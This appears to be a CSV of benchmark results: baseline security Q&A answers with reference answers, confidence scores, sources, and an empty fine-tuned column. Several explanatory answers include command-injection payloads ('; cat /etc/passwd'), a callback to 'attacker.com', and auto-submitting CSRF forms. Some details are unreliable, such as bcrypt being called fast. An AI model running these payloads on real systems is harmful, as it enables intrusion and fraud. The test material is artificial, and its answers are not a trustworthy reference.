question_id,question,reference_answer,baseline_answer,baseline_confidence,baseline_n_supported,baseline_n_sentences,baseline_sources,baseline_latency_sec,baseline_error,finetuned_answer,finetuned_confidence,finetuned_n_supported,finetuned_n_sentences,finetuned_sources,finetuned_latency_sec,finetuned_error
27,How do attackers exploit command injection vulnerabilities?,"Attackers exploit command injection vulnerabilities by terminating the intended command and injecting arbitrary commands using shell metacharacters such as semicolons, pipes, and command substitutions.","**How attackers exploit command‑injection vulnerabilities**

1. **Identify a vulnerable endpoint**  
   • The attacker finds a web page, API, or script that accepts user‑supplied data and passes it to an operating‑system command (e.g., `ping`, `curl`, `ls`, `cat`, `awk`, etc.).  
   • Common places: file‑upload handlers, search boxes, URL parameters, form fields, or any code that builds a shell command string.

2. **Inject shell metacharacters**  
   • The attacker appends or replaces part of the command with shell metacharacters that the shell interprets as control operators.  
   • Typical payloads:  
     - `;` – command separator (ends the intended command, starts a new one).  
     - `|` – pipe output to another command.  
     - `&&` / `||` – conditional execution.  
     - `` ` `` or `$()` – command substitution.  
     - Newlines or carriage returns – also act as separators in many shells.  
   • Example:  
     ```text
     8.8.8.8; cat /etc/passwd
     ```
     If the application runs `ping -c 1 $user_input` with `shell=True`, the shell executes `ping -c 1 8.8.8.8` **then** `cat /etc/passwd`.

3. **Execute arbitrary OS commands**  
   • Once the shell interprets the injected metacharacter, the attacker’s command runs with the privileges of the web‑server process.  
   • They can read files, modify configuration, launch reverse shells, or trigger other system actions.

4. **Use blind or out‑of‑band techniques when output is hidden**  
   • **Blind injection**: The application does not return command output. Attackers infer success by:  
     - **Time delays** – e.g., `sleep 5` and measuring response latency.  
     - **Conditional responses** – e.g., `if [ -f /etc/passwd ]; then sleep 5; fi`.  
   • **Out‑of‑band channels** – The injected command causes the server to contact an attacker‑controlled host (DNS lookup, HTTP request, SMTP send).  
     - Example: `curl http://attacker.com` or `ping -c 1 attacker.com`.  
   • These techniques let attackers confirm that their payload executed even without visible output.

5. **Escalate or pivot**  
   • With a command‑injection foothold, attackers can:
     - Read sensitive files (e.g., `/etc/passwd`, database config).  
     - Execute privileged commands if the web server runs as root.  
     - Install backdoors or reverse shells for persistent access.  
     - Move laterally to other systems using credentials discovered from the compromised host.

**Key take‑away:**  
Attackers exploit command injection by inserting shell metacharacters into user input that is concatenated into a shell command. They then execute arbitrary OS commands, often using blind or out‑of‑band methods to confirm success when output is suppressed. The attack’s impact depends on the privileges of the web‑server process and the sensitivity of the data or actions the injected commands can access.",42.83,16,25,doc41.txt; doc1.txt; doc2.txt,13.53,,,,,,,,skipped (model not loaded)
28,What is the primary defence against command injection?,The primary defence against command injection is to not invoke OS commands based on user input where alternatives exist.,"**Primary defence:**  
Never pass user‑supplied data to a shell. Use the language’s safe, non‑shell APIs (e.g., `subprocess.run()` with a list and `shell=False` in Python) or other language‑specific mechanisms that execute commands without invoking a shell interpreter. This eliminates the possibility of shell metacharacters being interpreted and thus blocks command injection.",52.11,3,3,doc41.txt; doc1.txt; doc15.txt,17.69,,,,,,,,skipped (model not loaded)
29,Why is it essential to run web applications with minimal privileges?,"Running web applications with minimal privileges limits the impact of command injection, as it prevents attackers from executing commands with elevated privileges.","Running a web application with the least privileges possible is a core security practice because it directly limits the damage an attacker can cause if the application is compromised.  

**Key reasons:**

| What happens if the app runs with high privileges | Why minimal privileges matter |
|---|---|
| **Full system compromise** – A command‑injection flaw (or any other vulnerability that lets the attacker execute code) runs with the same rights as the web server process. If that process is root, the attacker gains root access to the host, can install malware, tamper with the OS, and exfiltrate everything. | Running as a non‑root user (e.g., `www-data`, `nginx`, `apache`) means the injected code can only affect the web server’s own files and services, not the entire OS. |
| **Read/write to sensitive files** – Even a low‑privilege web server can read configuration files that contain database credentials, API keys, or other secrets. | With minimal privileges, the web server can be restricted to only the directories it needs (e.g., `/var/www/html`), preventing accidental or malicious access to `/etc/passwd`, `/var/lib/mysql`, or cloud‑metadata endpoints. |
| **Lateral movement** – An attacker can use the compromised process to pivot to other services (e.g., SSH, database, internal APIs). | Limiting the process’s network access (e.g., blocking outbound connections to internal IP ranges) and file system scope reduces the attack surface for lateral movement. |
| **Persistence** – A privileged process can install backdoors, create new users, or modify startup scripts. | A non‑privileged process cannot modify system startup or create privileged users, making persistence harder. |
| **Compliance & audit** – Many standards (PCI‑DSS, NIST SP 800‑53, ISO 27001) require the principle of least privilege. | Running with minimal rights helps satisfy these controls and simplifies audit evidence. |

**Practical impact in real‑world scenarios**

* **Command injection** – The OWASP and MITRE examples show that a shell metacharacter can execute arbitrary commands. If the web server runs as root, the attacker can `cat /etc/passwd`, `sudo apt‑get update`, or open a reverse shell. If it runs as a low‑privilege user, the attacker is limited to the files and processes that user can access.
* **Server‑Side Request Forgery (SSRF)** – An SSRF that reaches internal services can be mitigated by restricting the web server’s network scope. A privileged process could reach any internal endpoint; a restricted process cannot.
* **API vulnerabilities** – Even if an API is protected by authentication, a broken authorisation or injection flaw can still expose data. Running the API service with minimal privileges ensures that any data leakage is confined to the API’s own data store, not the entire system.

**Bottom line**

Running web applications with minimal privileges is essential because it enforces the *principle of least privilege*: the application should only have the rights it absolutely needs to function. This containment strategy:

1. **Reduces the blast radius** of any successful exploitation (e.g., command injection, SSRF, broken authorisation).
2. **Limits the attacker’s ability to pivot** to other services or install persistent malware.
3. **Simplifies compliance** and makes security audits easier.
4. **Improves overall system resilience** by preventing a single vulnerability from turning a web server into a full‑blown root compromise.

Therefore, always configure your web server, application processes, and any associated services to run under a dedicated, non‑privileged user account with only the file system, network, and system resources they truly require.",39.01,16,26,doc41.txt; doc19.txt; doc29.txt,18.95,,,,,,,,skipped (model not loaded)
30,What is related to command injection and can alter a command's behaviour even without shell invocation?,"Argument injection is related to command injection and can alter a command's behaviour even without shell invocation, for example, by passing --exec or --config arguments to programs that interpret them.","**Argument Injection** – a form of injection that can change a command’s behavior even when no shell is invoked.  

When user input is passed directly as an argument to a program (e.g., `--config`, `--exec`, `--user`), an attacker can supply values that alter the program’s logic or execution path. Unlike classic command injection, the payload is interpreted by the target application or the called program itself, not by a shell. Proper defense requires strict validation and whitelisting of allowed argument values.",59.31,3,4,doc41.txt; doc1.txt; doc19.txt,21.67,,,,,,,,skipped (model not loaded)
31,What is Cross-Site Request Forgery (CSRF)?,Cross-Site Request Forgery (CSRF) is an attack that tricks an authenticated user's browser into making an unwanted request to a web application they are currently authenticated to.,"**Cross‑Site Request Forgery (CSRF)** is a web‑application attack that tricks an authenticated user’s browser into sending an unwanted request to a site where the user is already logged in. Because browsers automatically attach the user’s session cookies to every request to that domain, the attacker can cause the victim to perform state‑changing actions (e.g., transfer money, change a password, delete a record) without the victim’s knowledge or consent.

### How it works
1. **Victim is authenticated** to a target site (e.g., `bank.com`) and has a valid session cookie stored in the browser.  
2. **Victim visits a malicious site** (e.g., `attacker.com`).  
3. The malicious page contains a hidden request that targets the victim’s site, such as:
   ```html
   <img src=""https://bank.com/transfer?to=attacker&amount=10000"">
   ```
   or a hidden form that auto‑submits:
   ```html
   <form action=""https://bank.com/transfer"" method=""POST"">
     <input name=""to"" value=""attacker"">
     <input name=""amount"" value=""10000"">
   </form>
   <script>document.forms[0].submit();</script>
   ```
4. The browser sends the request to `bank.com` **with the victim’s session cookie**.  
5. If the target site processes the request (e.g., performs a fund transfer), the action is executed as if the victim had performed it.

### Key characteristics
- **No JavaScript needed**: The attack relies on the browser’s automatic cookie handling, not on executing code in the victim’s browser.  
- **Same‑origin policy**: The attacker cannot read the response or the cookie value, which limits the attack to state‑changing actions.  
- **Different from XSS**: XSS injects code into the victim’s browser; CSRF exploits the server’s trust in the browser. If a site is vulnerable to XSS, CSRF defenses can often be bypassed.

### Common defenses
| Technique | How it works | Notes |
|-----------|--------------|-------|
| **CSRF tokens (Synchroniser Token Pattern)** | Server generates a unique, unpredictable token per session or request, embeds it in forms, and validates it on submission. | Most widely deployed; requires server‑side support. |
| **Double‑submit cookie** | Token is sent both as a cookie and as a request parameter; server checks they match. | Less secure if cookie attributes are misconfigured. |
| **SameSite cookie attribute** | `SameSite=Strict` or `SameSite=Lax` prevents browsers from sending the cookie on cross‑site requests. | Default in modern browsers; strong protection when used on session cookies. |
| **Origin/Referer header check** | Server verifies that the request’s `Origin` or `Referer` header matches the expected domain. | Useful as a defense‑in‑depth layer, but not foolproof (headers can be omitted). |

By combining these controls—especially CSRF tokens or SameSite cookies—most modern web applications can effectively mitigate CSRF attacks.",49.91,18,21,doc42.txt; doc2.txt; doc29.txt,10.3,,,,,,,,skipped (model not loaded)
32,How does a CSRF attack work when a victim visits a malicious page?,"A malicious image tag or form on the malicious page can trigger a GET or POST request to the victim's authenticated web application, which the browser sends with the victim's session cookie.","**How a CSRF attack unfolds when a victim visits a malicious page**

1. **Victim is already authenticated**  
   The user is logged into a target site (e.g., `bank.com`) and has a valid session cookie stored in the browser.

2. **Victim visits the attacker’s page**  
   The user navigates to a malicious site (e.g., `attacker.com`). The attacker’s page contains hidden code that will trigger a request to the target site.

3. **Browser automatically attaches the victim’s session cookie**  
   Modern browsers send all cookies for a domain with every request to that domain, regardless of where the request originates. Thus, when the malicious page initiates a request to `bank.com`, the browser includes the victim’s session cookie.

4. **Malicious request is sent to the target site**  
   The attacker can craft the request in several ways:

   * **Image/iframe trick (GET request)**  
     ```html
     <img src=""https://bank.com/transfer?to=attacker&amount=10000"" style=""display:none;"">
     ```
     The browser loads the image, which triggers a GET request to `bank.com`. If the bank processes fund transfers via GET (a design flaw), the transfer occurs.

   * **Auto‑submitted form (POST request)**  
     ```html
     <form action=""https://bank.com/transfer"" method=""POST"" style=""display:none;"">
       <input name=""to"" value=""attacker"">
       <input name=""amount"" value=""10000"">
     </form>
     <script>document.forms[0].submit();</script>
     ```
     The form is hidden and automatically submitted, sending a POST request with the victim’s session cookie.

5. **Target site processes the request**  
   Because the request carries a valid session cookie, the target server believes it comes from the authenticated user and executes the requested action (e.g., transferring money).

6. **Victim remains unaware**  
   The victim sees no indication that anything happened; the malicious page may even display a benign message or nothing at all.

**Key points**

- **No JavaScript needed on the victim’s side** – the attack relies on the browser’s automatic cookie handling.
- **Same‑origin policy protects the attacker** – the attacker cannot read the response or the victim’s cookie, but they don’t need to; they only need the cookie to be sent.
- **CSRF is about exploiting the server’s trust in the browser**, not the browser’s trust in the server (which is what XSS exploits).

This sequence—authenticated user → malicious page → automatic cookie‑laden request → unintended action—constitutes a classic CSRF attack.",55.99,15,15,doc42.txt; doc2.txt; doc1.txt,17.23,,,,,,,,skipped (model not loaded)
33,What is the main difference between CSRF and XSS attacks?,"CSRF exploits the server's trust in the browser (cookie-based session), while XSS exploits the browser's trust in the server (injected scripts).","**Main difference**

| Feature | CSRF | XSS |
|---------|------|-----|
| **What it exploits** | The web application’s trust in the user’s browser (automatic inclusion of session cookies in cross‑site requests). | The browser’s trust in the web application (injecting malicious scripts that run as if they came from the site). |
| **Typical payload** | A forged HTTP request (GET/POST) that the victim’s browser sends automatically, often without any JavaScript. | Malicious JavaScript code that is executed in the victim’s browser context. |
| **Capabilities** | Can perform state‑changing actions on behalf of the user but cannot read the response (same‑origin policy). | Can read responses, steal data, hijack sessions, perform phishing, etc. |
| **Defence focus** | CSRF tokens, SameSite cookies, Origin/Referer checks. | Output encoding, CSP, input validation, HTTPOnly cookies. |

In short, **CSRF tricks a user’s browser into sending a legitimate request with their credentials, while XSS injects code that runs in the user’s browser, giving the attacker far more power.**",53.76,8,9,doc2.txt; doc42.txt; doc3.txt,14.27,,,,,,,,skipped (model not loaded)
34,Why is the SameSite Cookie Attribute considered a strong CSRF protection measure?,"The SameSite attribute prevents browsers from including cookies in cross-site requests, making it difficult for attackers to exploit session cookies.","**SameSite is a strong CSRF defense because it removes the attacker’s ability to piggy‑back the victim’s session cookie on a cross‑origin request—exactly the mechanism that CSRF exploits.**

| What SameSite does | Why it blocks CSRF |
|--------------------|--------------------|
| **Strict** – the browser never sends the cookie on any cross‑site request (even a top‑level navigation). | An attacker can’t make the victim’s browser send the session cookie to the target site, so the request can’t be authenticated. |
| **Lax** – the cookie is omitted on cross‑site **POST** requests (but allowed on safe GETs that are top‑level navigations). | Most CSRF attacks target state‑changing POST (or other non‑GET) operations. By blocking the cookie on those requests, the attacker’s forged POST can’t be authenticated. |
| **Default in modern browsers** – when a site sets `SameSite=Strict` or `SameSite=Lax` on its session cookie, the browser enforces the rule automatically. | No server‑side code or token logic is required; the protection is baked into the browser’s request‑building process. |

**Key points that make it “strong”:**

1. **Browser‑level enforcement** – The rule is applied before the request reaches the server, so the server never sees a forged request with the victim’s cookie.
2. **No reliance on developer‑implemented tokens** – Even if a site forgets to add CSRF tokens or misconfigures them, SameSite still blocks the cookie from being sent in a cross‑origin request.
3. **Coverage of the most common CSRF vectors** – Since CSRF usually relies on the victim’s browser automatically attaching the session cookie to a request triggered by a malicious site, SameSite directly neutralises that core attack vector.
4. **Compatibility with existing session management** – It works with standard session cookies (e.g., `JSESSIONID`, `PHPSESSID`) without changing the application logic.

**Limitations (for completeness):**  
- SameSite does not protect against CSRF when the target site accepts credentials in query parameters or headers that the attacker can set directly.  
- Some legacy browsers or misconfigured sites may ignore the attribute.  
- It is most effective when combined with other controls (e.g., CSRF tokens, Origin/Referer checks) for defense‑in‑depth.

In short, SameSite is considered a strong CSRF protection measure because it leverages the browser’s built‑in cookie‑handling rules to prevent the very mechanism (automatic cookie inclusion) that CSRF attacks depend on.",48.57,13,16,doc42.txt; doc43.txt; doc29.txt,17.71,,,,,,,,skipped (model not loaded)
35,What is the purpose of the X-Frame-Options header in defending against Clickjacking?,"The X-Frame-Options header directs browsers not to render the page in a frame, preventing attackers from overlaying a legitimate site over a malicious page.","The **X‑Frame‑Options** HTTP response header tells browsers whether a page is allowed to be displayed inside a `<frame>`, `<iframe>`, or `<object>`.  
By setting this header, a site can:

* **Prevent clickjacking** – block malicious sites from embedding the page in a hidden or transparent frame so users cannot unknowingly click on the underlying content.  
* **Control framing scope** –  
  * `DENY` – disallow framing from any origin.  
  * `SAMEORIGIN` – allow framing only by pages from the same origin.  

Thus, X‑Frame‑Options is a simple, widely‑supported defense that stops attackers from tricking users into interacting with a page that is being framed by an attacker’s site.",38.53,3,5,doc42.txt; doc2.txt; doc08.txt,14.71,,,,,,,,skipped (model not loaded)
36,What is the primary purpose of cryptographic hash functions?,"Cryptographic hash functions produce a fixed-size digest (hash) from arbitrary-length input data, with properties that make them suitable for integrity verification, digital signatures, and password storage.","Cryptographic hash functions are designed to take data of any length and produce a fixed‑size, seemingly random digest that can be used as a one‑way “fingerprint” of the original data. Their primary purpose is to enable **data integrity and authentication**—verifying that data has not been altered and, in the case of digital signatures, proving the origin of a message. They are also used (with additional mechanisms such as salting and key stretching) for secure password storage, but the core function is to provide a fast, irreversible, collision‑resistant hash for integrity checks.",51.77,3,3,doc45.txt; doc4.txt; doc40.txt,15.83,,,,,,,,skipped (model not loaded)
37,What is the difference between pre-image resistance and second pre-image resistance in cryptographic hash functions?,"Pre-image resistance prevents reversing the hash to recover the original data, while second pre-image resistance prevents replacing a known file with a malicious one having the same hash.","**Pre‑image resistance**  
- **What it protects against:** An attacker is given only the hash value *H* and must find *any* message *M* that produces that hash.  
- **Goal:** Make it computationally infeasible to recover a message that maps to a specified hash.  
- **Typical use:** Preventing an attacker from reversing a hash to discover the original data (e.g., a password).

**Second pre‑image resistance**  
- **What it protects against:** An attacker is given a specific message *M₁* and its hash *H = hash(M₁)*, and must find a *different* message *M₂ ≠ M₁* that also hashes to *H*.  
- **Goal:** Make it infeasible to replace a known file or credential with a malicious one that has the same hash.  
- **Typical use:** Ensuring that a file or document cannot be swapped out for a counterfeit that would still pass integrity checks.

**Key difference**

| Feature | Pre‑image resistance | Second pre‑image resistance |
|---------|----------------------|-----------------------------|
| Known input | No input is known; only the hash is given. | A specific input *M₁* is known. |
| Target | Any message that hashes to *H*. | A *different* message that hashes to the same *H*. |
| Difficulty | Generally harder because the attacker must search the entire input space. | Usually easier because the attacker can tailor the search around the known *M₁*. |

Both properties are part of a hash function’s security profile, but they address distinct attack scenarios: pre‑image resistance guards against reverse‑engineering a hash, while second pre‑image resistance guards against forging a different input that masquerades as the original.",47.65,10,13,doc45.txt; doc4.txt; doc16.txt,16.38,,,,,,,,skipped (model not loaded)
38,Why should MD5 not be used for digital signatures or certificate fingerprints?,"MD5 is fully broken for security purposes and has been demonstrated to have practical collision attacks, making it unsuitable for secure applications.","**MD5 should not be used for digital signatures or certificate fingerprints because it is cryptographically broken and vulnerable to collision attacks that can be exploited in practice.**

| Reason | What it means for signatures / fingerprints |
|--------|---------------------------------------------|
| **Collision attacks are practical** | In 1996 a collision was demonstrated, and by 2004 MD5 was considered “fully broken” for security purposes. Attackers can now generate two distinct messages that hash to the same MD5 value in a matter of minutes on commodity hardware. |
| **Pre‑image resistance is weakened** | While pre‑image attacks are still hard, the existence of collisions undermines the assumption that a hash uniquely identifies a message. |
| **Digital signatures rely on collision resistance** | A signature is valid if the hash of the signed data matches the hash embedded in the signature. If an attacker can produce a different document with the same MD5 hash, they can forge a signature for a malicious document. |
| **Certificate fingerprints are used for integrity checks** | Browsers and TLS clients compare the fingerprint of a server’s certificate to a known value. If MD5 collisions are easy, an attacker could create a fraudulent certificate that matches the expected fingerprint, bypassing integrity verification. |
| **Browsers and standards have deprecated MD5** | NIST deprecated SHA‑1 in 2011 and MD5 earlier; modern TLS, code‑signing, and PKI implementations no longer accept MD5‑based signatures or fingerprints. |

**Bottom line:** Because MD5 collisions can be generated efficiently, using it for signatures or certificate fingerprints would allow an attacker to forge or tamper with signed data or certificates without detection. Modern applications should use SHA‑256, SHA‑384, SHA‑512, or SHA‑3 for these purposes.",43.83,9,10,doc45.txt; doc25.txt; doc36.txt,22.34,,,,,,,,skipped (model not loaded)
39,How does Argon2 resist GPU attacks?,"Argon2 is resistant to GPU attacks due to its memory-hard properties, making parallelism on GPUs/ASICs more costly.","**Argon2’s resistance to GPU‑based cracking comes from its *memory‑hard* design and the way it forces each hash computation to use a large, sequentially‑accessed memory block.**

| Feature | How it thwarts GPUs |
|---------|---------------------|
| **Memory‑hardness** | Each hash requires a user‑defined amount of RAM (the *memory cost* parameter). GPUs can run thousands of threads in parallel, but they are limited by the amount of fast memory (VRAM) they can allocate per thread. If the memory cost is set to, say, 1 GB, a GPU can only run a handful of threads at once, dramatically reducing throughput compared to a CPU that can keep many cores busy. |
| **Sequential memory access** | Argon2 fills a 2‑D array of blocks. Every block is computed from a few previous blocks, so the algorithm must read and write the array in a largely sequential order. GPUs excel at highly parallel, random‑access patterns; the sequential dependency forces the GPU to stall while waiting for data, killing its throughput advantage. |
| **Data‑dependent memory accesses (Argon2d)** | In the *Argon2d* variant, the indices of the blocks that are read depend on the data being processed. This makes it impossible for a GPU to pre‑fetch or cache the needed memory locations, further reducing performance. |
| **Data‑independent memory accesses (Argon2i)** | The *Argon2i* variant uses a fixed access pattern, which protects against side‑channel attacks but still keeps the memory usage high. The hybrid *Argon2id* combines both to balance security and performance. |
| **Configurable work factor** | The algorithm’s *time cost* (number of passes) and *parallelism* (number of threads) can be tuned. By increasing the time cost, you make each hash slower for all hardware, but the memory cost remains the limiting factor for GPUs. |

**Bottom line:**  
Argon2 forces an attacker to allocate a large amount of memory per hash and to perform largely sequential, data‑dependent memory accesses. GPUs, which rely on massive parallelism and fast random access, cannot keep up when the memory requirement exceeds their VRAM or when the algorithm forces them to wait for data. This makes GPU‑accelerated brute‑force or dictionary attacks orders of magnitude slower than with fast, CPU‑friendly hash functions like SHA‑256 or bcrypt.",27.38,4,15,doc08.txt; doc45.txt; doc40.txt,19.74,,,,,,,,skipped (model not loaded)
40,What is the purpose of salting in password hashing?,"Salting prevents precomputed rainbow table attacks and ensures identical passwords produce different hashes, making it a crucial component of secure password storage.","Salting is the practice of adding a unique, random value (the *salt*) to each password before it is hashed.  
Its main purposes are:

1. **Defeat pre‑computed rainbow tables** – A rainbow table is a large lookup table of hash values for common passwords. If every password were hashed the same way, an attacker could simply look up the hash in the table. By appending a random salt, the hash output changes for every user, so the attacker would need a separate table for each possible salt, which is infeasible.

2. **Make identical passwords produce different hashes** – Even if two users choose the same password, the salts will differ, so their stored hash values will be distinct. This prevents an attacker from inferring that two accounts share a password just by comparing hashes.

3. **Force per‑account work** – Because the salt is unique, an attacker cannot reuse a single brute‑force or dictionary run across many accounts; each password must be hashed with its own salt, increasing the effort required.

In practice, modern password‑hashing libraries (bcrypt, Argon2, PBKDF2, etc.) generate and store the salt automatically, so developers need not handle it manually.",37.75,7,9,doc45.txt; doc40.txt; doc4.txt,16.91,,,,,,,,skipped (model not loaded)
41,What is the primary function of a firewall in network security?,"Firewalls filter incoming and outgoing traffic based on defined security rules to prevent unauthorized access, misuse, modification, or denial of a computer network and its accessible resources.","The primary function of a firewall in network security is to **filter incoming and outgoing network traffic according to a set of predefined security rules**. By inspecting packets (or higher‑level application data in the case of proxy or next‑generation firewalls) and allowing or blocking them based on criteria such as IP addresses, port numbers, protocols, and application context, the firewall establishes a controlled boundary that protects internal resources from unauthorized access, misuse, or malicious activity.",74.65,2,2,doc5.txt; doc37.txt; doc38.txt,17.09,,,,,,,,skipped (model not loaded)
42,How does a Stateful Inspection Firewall differ from a Packet Filtering Firewall?,"A Stateful Inspection Firewall tracks the state of active connections and makes filtering decisions based on context, whereas a Packet Filtering Firewall inspects packets at the network layer and filters based on IP addresses, port numbers, and protocols.","**Key difference:**  
A **packet‑filtering firewall** makes decisions on a *per‑packet* basis, using only the packet’s header fields (IP address, port, protocol). It is **stateless** – it does not remember anything about the conversation that the packet belongs to.  

A **stateful‑inspection firewall** keeps a table of all active connections (the “state table”) and makes filtering decisions based on the *context* of the packet within that connection. It checks whether a packet is part of a legitimate, established session, and can enforce rules that depend on the direction, sequence, or state of the traffic.

| Feature | Packet‑Filtering Firewall | Stateful‑Inspection Firewall |
|---------|---------------------------|------------------------------|
| **State awareness** | None – each packet is evaluated in isolation | Maintains connection state (established, half‑open, closed) |
| **Decision criteria** | Header fields only (IP, port, protocol) | Header fields + connection state, sequence numbers, flags |
| **Protection against** | Basic spoofing, simple port‑scans | Spoofed packets, incomplete handshakes, SYN‑floods, session hijacking |
| **Performance impact** | Low – minimal processing | Higher – requires memory for state table and per‑packet checks |
| **Typical use** | Edge routers, simple perimeter protection | Core network security, where deeper inspection is needed |

In short, a packet‑filtering firewall is a fast, simple filter that treats every packet independently, while a stateful‑inspection firewall adds a layer of context‑aware scrutiny, allowing it to enforce more sophisticated security policies and defend against attacks that rely on manipulating connection state.",53.84,4,5,doc5.txt; doc13.txt; doc37.txt,13.1,,,,,,,,skipped (model not loaded)
43,What is the main difference between an Intrusion Detection System (IDS) and an Intrusion Prevention System (IPS)?,"An IDS logs and alerts on threats, whereas an IPS actively blocks them.","**IDS vs. IPS – the key distinction**

| Feature | IDS (Intrusion Detection System) | IPS (Intrusion Prevention System) |
|---------|----------------------------------|-----------------------------------|
| **Deployment mode** | Out‑of‑band (passive) – receives a copy of traffic via a tap or SPAN port. | Inline – sits in the direct path of traffic. |
| **Primary function** | Detects suspicious activity and generates alerts for human review. | Detects suspicious activity **and** automatically blocks or drops the offending traffic (e.g., reset connections, drop packets, block source IP). |
| **Impact on traffic** | No impact; traffic flows normally. | Can alter or terminate traffic in real time. |
| **Risk of false positives** | Alerts only; no immediate operational impact. | False positives can block legitimate traffic, so tuning is critical. |

In short, an IDS **detects and alerts**, while an IPS **detects and actively prevents** by blocking malicious traffic.",43.58,5,9,doc13.txt; doc5.txt; doc12.txt,14.96,,,,,,,,skipped (model not loaded)
44,Why is network segmentation important in network security?,"Network segmentation divides a network into smaller sub-networks (VLANs or subnets) to limit the blast radius of a breach, thereby reducing the impact of a potential security incident.","Network segmentation is a foundational security practice that divides a larger network into smaller, isolated zones (VLANs, sub‑nets, or even workload‑level micro‑segments). Its importance stems from several inter‑related benefits that directly strengthen an organization’s overall security posture:

| Why segmentation matters | What it achieves | How it ties into modern security models |
|--------------------------|------------------|----------------------------------------|
| **Containment of breaches** | If an attacker compromises one segment, lateral movement to other segments is blocked unless explicitly allowed. | Core Zero‑Trust principle: “assume breach” and “verify explicitly” – each zone is treated as a separate trust boundary. |
| **Least‑privilege enforcement** | Traffic between zones is governed by explicit firewall rules (allow‑list/whitelist) and default‑deny policies. | Aligns with the Zero‑Trust pillars of Identity, Device, Network, Application, and Data. |
| **Granular visibility & control** | Network traffic can be monitored, logged, and audited per zone, making anomalous activity easier to spot. | Supports SIEM correlation, IDS/IPS placement, and continuous monitoring required by NIST SP 800‑207. |
| **Reduced blast radius** | A compromised server or application in one zone cannot automatically reach critical assets (e.g., PCI, HR, or production databases). | Micro‑segmentation (e.g., per‑VM or per‑container) is the most granular form of this containment. |
| **Simplified compliance** | Many regulations (PCI‑DSS, HIPAA, GDPR) require separation of sensitive data and systems. | Segmentation zones (e.g., PCI, cardholder data environment) map directly to compliance domains. |
| **Performance & scalability** | By isolating traffic, you can optimize routing, apply QoS, and avoid broadcast storms. | Physical segmentation is the most isolated but costly; VLANs and SD‑Nets provide a cost‑effective balance. |
| **Facilitates Zero‑Trust Network Access (ZTNA)** | ZTNA replaces VPNs by authenticating users to specific applications, not to a broad network. | Segmentation ensures that even authenticated users can only reach the resources they’re authorized for. |
| **Easier testing & validation** | Penetration tests, firewall rule reviews, and network scans can confirm that isolation actually exists. | Regular testing is a requirement in NIST SP 800‑207 and SANS best practices. |

### How segmentation fits into the broader security stack

1. **Firewalls & ACLs** – Act as the gatekeepers between zones, enforcing the “default deny, allow only what is needed” rule.  
2. **IDS/IPS** – Placed at inter‑zone boundaries to detect and block malicious traffic that tries to cross segments.  
3. **SIEM & EDR** – Correlate alerts from segmented zones to detect lateral movement patterns.  
4. **SASE & SD‑WAN** – Deliver consistent segmentation policies to remote users, ensuring that cloud‑first workloads are protected just as on‑prem resources are.  

### Bottom line

Network segmentation is essential because it turns a flat, “trusted inside” network into a series of tightly controlled, least‑privilege zones. This containment reduces the impact of any single compromise, makes lateral movement difficult, and provides the granular control required by Zero‑Trust architectures, compliance mandates, and modern cloud‑centric environments. Without segmentation, a successful attack on one part of the network can quickly spread, undermining all other security controls.",48.54,20,25,doc37.txt; doc5.txt; doc13.txt,16.03,,,,,,,,skipped (model not loaded)
45,What is the primary advantage of a Modern Zero-Trust Network Architecture (ZTNA) over traditional VPN models?,"A ZTNA applies continuous verification rather than implicit trust within the network perimeter, providing a more secure and dynamic approach to network access control.","**Primary advantage:**  
ZTNA replaces the “one‑size‑fits‑all” network access of a VPN with *application‑level, continuously verified access*.  
- **Granular control:** Users are authenticated and authorized for each specific application or service, not for the entire corporate network.  
- **Continuous verification:** Identity, device health, and context are checked on every access attempt, so a compromised credential or device cannot be used to roam laterally.  
- **Reduced attack surface:** Because no broad network connectivity is granted, lateral movement is blocked and the blast radius of a breach is limited.  

In short, ZTNA eliminates the implicit trust and wide‑open network access that VPNs provide, giving tighter, real‑time control over who can reach what resources.",44.45,4,5,doc37.txt; doc5.txt; doc44.txt,18.08,,,,,,,,skipped (model not loaded)
